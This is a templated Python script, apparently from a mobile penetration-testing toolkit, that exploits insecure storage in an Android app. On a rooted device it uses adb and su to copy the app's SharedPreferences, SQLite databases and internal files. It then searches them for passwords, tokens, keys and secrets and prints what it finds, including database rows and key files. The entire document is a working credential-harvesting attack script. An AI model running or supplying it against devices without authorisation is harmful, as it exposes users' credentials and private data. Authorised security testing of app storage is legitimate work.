#!/usr/bin/env python3
"""
Insecure Storage Exploitation
Target: {{ package_name }}
Storage Type: {{ storage_type }}
"""

import subprocess
import os
import sqlite3
import json

# Configuration
PACKAGE_NAME = "{{ package_name }}"
TARGET_FILES = {{ target_files | tojson }}

def extract_shared_preferences():
    """Extract SharedPreferences files"""
    print("[*] Extracting SharedPreferences...")

    try:
        # Pull SharedPreferences files
        prefs_path = f"/data/data/{PACKAGE_NAME}/shared_prefs/"
        subprocess.run(['adb', 'shell', 'su', '-c', f'cp -r {prefs_path} /sdcard/'])
        subprocess.run(['adb', 'pull', '/sdcard/shared_prefs', './'])

        # Parse XML files
        for file in os.listdir('./shared_prefs'):
            if file.endswith('.xml'):
                print(f"[+] Found: {file}")
                with open(os.path.join('./shared_prefs', file), 'r') as f:
                    content = f.read()
                    if any(keyword in content.lower() for keyword in ['password', 'token', 'key', 'secret']):
                        print(f"[!] Sensitive data found in {file}")
                        print(content[:500] + "..." if len(content) > 500 else content)

    except Exception as e:
        print(f"[-] Error extracting SharedPreferences: {e}")

def extract_databases():
    """Extract and analyze SQLite databases"""
    print("[*] Extracting databases...")

    try:
        # Pull database files
        db_path = f"/data/data/{PACKAGE_NAME}/databases/"
        subprocess.run(['adb', 'shell', 'su', '-c', f'cp -r {db_path} /sdcard/'])
        subprocess.run(['adb', 'pull', '/sdcard/databases', './'])

        # Analyze SQLite databases
        for file in os.listdir('./databases'):
            if file.endswith('.db') or file.endswith('.sqlite'):
                print(f"[+] Analyzing database: {file}")

                conn = sqlite3.connect(os.path.join('./databases', file))
                cursor = conn.cursor()

                # Get all tables
                cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                tables = cursor.fetchall()

                for table in tables:
                    table_name = table[0]
                    print(f"  Table: {table_name}")

                    # Get table schema
                    cursor.execute(f"PRAGMA table_info({table_name});")
                    columns = cursor.fetchall()

                    # Look for sensitive columns
                    sensitive_columns = []
                    for col in columns:
                        col_name = col[1].lower()
                        if any(keyword in col_name for keyword in ['password', 'token', 'key', 'secret', 'auth']):
                            sensitive_columns.append(col[1])

                    if sensitive_columns:
                        print(f"    [!] Sensitive columns found: {sensitive_columns}")

                        # Extract data
                        cursor.execute(f"SELECT * FROM {table_name} LIMIT 5;")
                        rows = cursor.fetchall()
                        for row in rows:
                            print(f"    Data: {row}")

                conn.close()

    except Exception as e:
        print(f"[-] Error extracting databases: {e}")

def extract_files():
    """Extract internal files"""
    print("[*] Extracting internal files...")

    try:
        # Pull files directory
        files_path = f"/data/data/{PACKAGE_NAME}/files/"
        subprocess.run(['adb', 'shell', 'su', '-c', f'cp -r {files_path} /sdcard/'])
        subprocess.run(['adb', 'pull', '/sdcard/files', './'])

        # Check for sensitive files
        for root, dirs, files in os.walk('./files'):
            for file in files:
                file_path = os.path.join(root, file)
                print(f"[+] Found file: {file}")

                # Check for sensitive extensions
                if file.endswith(('.key', '.pem', '.p12', '.jks', '.keystore')):
                    print(f"[!] Potential key file: {file}")

                # Check file content
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        if any(keyword in content.lower() for keyword in ['password', 'private', 'secret']):
                            print(f"[!] Sensitive content in {file}")
                            print(content[:500] + "..." if len(content) > 500 else content)
                except:
                    pass

    except Exception as e:
        print(f"[-] Error extracting files: {e}")

def exploit():
    """Run insecure storage exploitation"""
    print(f"[*] Starting exploitation of {PACKAGE_NAME}")

    # Check if device is rooted
    result = subprocess.run(['adb', 'shell', 'su', '-c', 'id'], capture_output=True, text=True)
    if 'uid=0' not in result.stdout:
        print("[-] Device needs to be rooted for this exploit")
        return

    # Extract different storage types
    extract_shared_preferences()
    extract_databases()
    extract_files()

    print("[*] Exploitation complete")

if __name__ == "__main__":
    exploit()